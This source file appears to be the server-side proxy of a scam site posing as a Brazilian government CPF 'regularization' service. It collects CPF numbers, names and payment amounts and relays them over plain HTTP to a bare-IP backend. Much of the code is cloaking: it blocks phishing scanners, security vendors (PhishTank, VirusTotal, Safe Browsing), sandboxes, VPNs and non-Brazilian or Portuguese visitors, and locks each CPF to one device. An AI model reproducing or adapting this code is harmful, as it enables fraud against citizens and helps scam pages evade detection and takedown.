import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const ALLOWED_ORIGINS = [
  'https://my-status-checker.lovable.app',
  'https://id-preview--01e93b99-5c41-441e-b33b-75968963ece1.lovable.app',
  'https://gov.cpfregularizado.org',
  'https://govbr.cpfregularizado.org',
  'https://gov.regularizarocpf.org',
  'https://govbr.regularizarocpf.org',
  'https://gov.meucpf.org',
  'https://govbr.meucpf.org',
];

function getCorsHeaders(req: Request) {
  const origin = req.headers.get('origin') || '';
  const allowed = ALLOWED_ORIGINS.includes(origin) || origin.endsWith('.lovable.app');
  return {
    'Access-Control-Allow-Origin': allowed ? origin : ALLOWED_ORIGINS[0],
    'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Vary': 'Origin',
  };
}

const API_BASE = 'http://77.110.115.28:5001';
const RECAPTCHA_SECRET = Deno.env.get('RECAPTCHA_SECRET_KEY') || '';
const ALLOWED_COUNTRIES = ['BR', 'PT'];

// ─── Bot detection ───────────────────────────────────────────
const BOT_PATTERNS = [
  /bot/i, /crawl/i, /spider/i, /slurp/i, /curl/i, /wget/i, /python/i,
  /httpx/i, /scrapy/i, /phantomjs/i, /headless/i, /selenium/i,
  /puppeteer/i, /playwright/i, /lighthouse/i, /node-fetch/i, /axios/i,
  /Go-http-client/i, /Java\//i, /okhttp/i, /undici/i, /fetch\//i,
  /urlscan/i, /scan/i, /checker/i, /monitor/i, /probe/i,
  /PhishTank/i, /SafeBrowsing/i, /VirusTotal/i, /Sucuri/i, /Netcraft/i,
  /ScamAdviser/i, /CheckPhish/i, /PhishLabs/i, /Fraudwatch/i,
  /BrandShield/i, /Bolster/i, /Cofense/i, /ZeroFox/i,
  /sandbox/i, /detonation/i, /cuckoo/i, /joe.?sandbox/i,
  /hybrid.?analysis/i, /any\.run/i, /rendertron/i, /prerender/i,
  /browsershot/i, /screenshotmachine/i, /preview/i, /inspector/i,
  /link.?check/i, /site.?check/i, /url.?check/i,
  /safe.?browse/i, /phish.?detect/i, /fraud.?detect/i,
  /threat.?intel/i, /reputation/i, /analysis/i,
  /Apache-HttpClient/i, /libwww/i, /http-client/i,
];

const SCANNER_IP_PREFIXES = [
  '185.180.143.', '167.248.133.', '71.6.',
  '198.235.24.', '66.240.', '93.120.27.',
  '94.102.49.', '64.62.202.', '193.163.125.', '2.57.122.',
];

function isBotRequest(req: Request): boolean {
  const ua = req.headers.get('user-agent') || '';
  if (!ua || ua.length < 20) return true;
  if (BOT_PATTERNS.some(p => p.test(ua))) return true;

  const ip = getClientIp(req);
  if (SCANNER_IP_PREFIXES.some(prefix => ip.startsWith(prefix))) return true;

  const acceptLang = req.headers.get('accept-language') || '';
  if (!acceptLang || acceptLang === '*') return true;
  const secChUa = req.headers.get('sec-ch-ua') || '';
  if (secChUa.includes('HeadlessChrome') || secChUa.includes('Headless')) return true;

  // Chrome without sec-fetch headers = likely not a real browser
  const secFetchDest = req.headers.get('sec-fetch-dest') || '';
  const secFetchMode = req.headers.get('sec-fetch-mode') || '';
  if (!secFetchDest && !secFetchMode && /Chrome\/\d/.test(ua)) return true;

  const hasBrPtLang = /pt|br|en/i.test(acceptLang);
  if (!hasBrPtLang) return true;

  return false;
}

function getClientIp(req: Request): string {
  const xff = req.headers.get('x-forwarded-for');
  if (xff) {
    const first = xff.split(',')[0]?.trim();
    if (first && first !== '127.0.0.1' && first !== '::1') return first;
  }
  return req.headers.get('cf-connecting-ip') || req.headers.get('x-real-ip') || '0.0.0.0';
}

// ─── Geo + privacy check (ipinfo primary, fallbacks) ─────────
async function isAllowedGeo(ip: string): Promise<{ allowed: boolean; reason?: string }> {
  if (ip === '0.0.0.0' || ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('172.')) return { allowed: true };

  // Primary: ipinfo.io
  const token = Deno.env.get('IPINFO_API_KEY');
  if (token) {
    try {
      const res = await fetch(`https://ipinfo.io/${ip}?token=${token}`, {
        signal: AbortSignal.timeout(3000),
        headers: { 'Accept': 'application/json' },
      });
      const data = await res.json();
      if (data.country) {
        if (!ALLOWED_COUNTRIES.includes(data.country)) {
          console.log(`[api-proxy] ipinfo geo blocked: ${ip} country=${data.country}`);
          return { allowed: false, reason: 'geo' };
        }
        const privacy = data.privacy || {};
        if (privacy.vpn || privacy.proxy || privacy.tor || privacy.relay) {
          console.log(`[api-proxy] ipinfo privacy blocked: ${ip} vpn=${privacy.vpn} proxy=${privacy.proxy} tor=${privacy.tor}`);
          return { allowed: false, reason: 'vpn' };
        }
        // Block foreign hosting (BR/PT hosting is allowed)
        if (privacy.hosting && !ALLOWED_COUNTRIES.includes(data.country)) {
          console.log(`[api-proxy] ipinfo hosting blocked: ${ip}`);
          return { allowed: false, reason: 'bot' };
        }
        return { allowed: true };
      }
    } catch (e) {
      console.error('[api-proxy] ipinfo error:', e);
    }
  }

  // Fallback: ip-api.com
  try {
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,countryCode,hosting,proxy`, { signal: AbortSignal.timeout(3000) });
    const data = await res.json();
    if (data.status === 'success') {
      if (!ALLOWED_COUNTRIES.includes(data.countryCode)) return { allowed: false, reason: 'geo' };
      if (data.proxy) return { allowed: false, reason: 'vpn' };
      if (data.hosting && !ALLOWED_COUNTRIES.includes(data.countryCode)) return { allowed: false, reason: 'bot' };
      return { allowed: true };
    }
  } catch {}

  // Fallback: ipwho.is
  try {
    const res = await fetch(`https://ipwho.is/${ip}`, { signal: AbortSignal.timeout(3000) });
    const data = await res.json();
    if (data.success) {
      if (!ALLOWED_COUNTRIES.includes(data.country_code)) return { allowed: false, reason: 'geo' };
      return { allowed: true };
    }
  } catch {}

  return { allowed: false, reason: 'geo' }; // fail-closed
}

// ─── Device lock helpers ─────────────────────────────────────
async function checkDeviceLock(supabase: any, cpf: string, deviceId: string, userAgent: string): Promise<{ allowed: boolean; reason?: string }> {
  if (!cpf || !deviceId) return { allowed: false, reason: 'missing_params' };

  const { data: existing } = await supabase
    .from('cpf_device_locks')
    .select('device_id')
    .eq('cpf', cpf)
    .maybeSingle();

  if (existing) {
    if (existing.device_id === deviceId) {
      return { allowed: true };
    }
    console.log(`[device-lock] CPF ${cpf} locked to device ${existing.device_id}, rejecting ${deviceId}`);
    return { allowed: false, reason: 'device_locked' };
  }

  // First access — lock CPF to this device
  await supabase.from('cpf_device_locks').insert({
    cpf,
    device_id: deviceId,
    user_agent: (userAgent || '').substring(0, 500),
  });
  console.log(`[device-lock] CPF ${cpf} locked to device ${deviceId}`);
  return { allowed: true };
}

async function verifyRecaptcha(token: string): Promise<boolean> {
  if (!token || !RECAPTCHA_SECRET) return false;
  try {
    const res = await fetch('https://www.google.com/recaptcha/api/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${RECAPTCHA_SECRET}&response=${token}`,
    });
    const data = await res.json();
    return data.success === true;
  } catch {
    return false;
  }
}

Deno.serve(async (req) => {
  const corsHeaders = getCorsHeaders(req);
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  // Handle GET for logo proxy
  const url = new URL(req.url);
  if (url.searchParams.get('asset') === 'logo') {
    try {
      const response = await fetch(`${API_BASE}/logo`);
      const blob = await response.blob();
      return new Response(blob, {
        headers: {
          ...corsHeaders,
          'Content-Type': response.headers.get('Content-Type') || 'image/png',
          'Cache-Control': 'public, max-age=86400',
        },
      });
    } catch {
      return new Response('Logo not found', { status: 404, headers: corsHeaders });
    }
  }

  try {
    // ─── Bot check ─────────────────────────────────────────
    if (isBotRequest(req)) {
      console.log(`[api-proxy] Bot blocked: ${req.headers.get('user-agent')?.substring(0, 80)}`);
      return new Response(JSON.stringify({ error: 'Acesso negado' }), {
        status: 403,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    // ─── Geo + privacy check (ipinfo + fallbacks) ───────────
    const ip = getClientIp(req);
    const geoResult = await isAllowedGeo(ip);
    if (!geoResult.allowed) {
      const msg = geoResult.reason === 'vpn' 
        ? 'VPN ou proxy detectado. Desative e tente novamente.'
        : geoResult.reason === 'bot'
          ? 'Acesso negado'
          : 'Acesso restrito à sua região';
      console.log(`[api-proxy] Blocked: ${ip} reason=${geoResult.reason}`);
      return new Response(JSON.stringify({ error: msg }), {
        status: 403,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const body = await req.json();
    const { endpoint, cpf, nome, valor, recaptchaToken, deviceId } = body;

    const allowedEndpoints = ['/consulta', '/pendencias', '/criar-venda', '/status-venda', '/pendencias_vag'];
    if (!endpoint || !allowedEndpoints.includes(endpoint)) {
      return new Response(JSON.stringify({ error: 'Invalid endpoint' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const supabase = createClient(
      Deno.env.get('SUPABASE_URL')!,
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!
    );

    // ─── Whitelist check (when enabled) ────────────────────────
    const cpfEndpoints = ['/consulta', '/pendencias', '/criar-venda', '/pendencias_vag'];
    if (cpf && cpfEndpoints.includes(endpoint)) {
      // Check whitelist setting
      const settingRes = await supabase
        .from('app_settings')
        .select('value')
        .eq('key', 'whitelist_enabled')
        .maybeSingle();
      const whitelistEnabled = settingRes.data?.value === 'true';

      if (whitelistEnabled) {
        const cleanCpf = cpf.replace(/\D/g, '');
        const { data: whitelisted } = await supabase
          .from('cpf_whitelist')
          .select('cpf')
          .eq('cpf', cleanCpf)
          .maybeSingle();

        if (!whitelisted) {
          console.log(`[api-proxy] CPF ${cleanCpf} not in whitelist — blocked`);
          return new Response(JSON.stringify({ error: 'CPF não encontrado no sistema. Verifique os dados e tente novamente.', blocked: true }), {
            status: 403,
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          });
        }
      }
    }

    // ─── Device lock enforcement for CPF-related endpoints ─
    if (cpf && cpfEndpoints.includes(endpoint)) {
      if (!deviceId) {
        return new Response(JSON.stringify({ error: 'Dispositivo não identificado' }), {
          status: 403,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      const lockResult = await checkDeviceLock(supabase, cpf, deviceId, req.headers.get('user-agent') || '');
      if (!lockResult.allowed) {
        return new Response(JSON.stringify({ 
          error: 'Este CPF já está vinculado a outro dispositivo. Por segurança, a consulta só pode ser realizada no dispositivo original.',
          device_locked: true 
        }), {
          status: 403,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }
    }

    // Verify reCAPTCHA v2 only for /consulta
    if (endpoint === '/consulta' && recaptchaToken) {
      const passed = await verifyRecaptcha(recaptchaToken);
      if (!passed) {
        console.log('reCAPTCHA v2 verification failed');
        return new Response(JSON.stringify({ error: 'reCAPTCHA verification failed', blocked: true }), {
          status: 403,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }
    }

    let response;
    if (endpoint === '/criar-venda') {
      response = await fetch(`${API_BASE}${endpoint}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cpf, nome, valor }),
      });
    } else if (endpoint === '/status-venda') {
      const { transactionId } = body;
      if (!transactionId) {
        return new Response(JSON.stringify({ error: 'Missing transactionId' }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }
      response = await fetch(`${API_BASE}/status-venda/${transactionId}`, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' },
      });
    } else {
      const formData = new URLSearchParams();
      formData.append('cpf', cpf);
      response = await fetch(`${API_BASE}${endpoint}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: formData.toString(),
      });
    }

    const data = await response.json();

    return new Response(JSON.stringify(data), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (error) {
    console.error('Proxy error:', error);
    return new Response(JSON.stringify({ error: 'Erro interno' }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
